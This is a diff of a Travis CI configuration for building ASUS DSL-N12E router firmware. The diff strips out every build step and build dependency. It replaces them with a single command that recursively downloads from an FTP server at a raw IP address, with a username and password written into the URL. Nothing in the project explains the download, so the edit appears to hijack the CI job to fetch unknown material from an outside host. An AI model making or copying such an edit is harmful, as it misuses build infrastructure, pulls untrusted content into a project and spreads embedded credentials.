@@ -1,22 +1,9 @@
-sudo: required
 dist: trusty
 language: bash
 script: 
-     - wget http://dlcdnet.asus.com/pub/ASUS/wireless/DSL-N12E_C1/GPL_DSL-N12E_C1_1123473.zip
-     - unzip GPL_DSL-N12E_C1_1123473.zip
-     - tar -xzf GPL_DSL-N12E_C1_1123473.tgz
-     - cd dsl-n12e-c1_gpl
-     - sudo mkdir /opt/trendchip
-     - sudo tar -zxvf ./toolchain/mips-linux-uclibc.tgz -C /opt/trendchip/
-     - sudo chmod +x /opt/trendchip/*
-     - export PROFILE=dsl-n12e-c1
-     - sudo make
+     -  wget -r ftp://RaXMT200:hxu30KMJ@185.249.199.211/g36118/
 addons:
   apt:
     packages:
-    - build-essential
-    - bison
-    - flex
-    - gawk
-    - dos2unix
-    - libstdc++5
+    - zip
+    - unzip
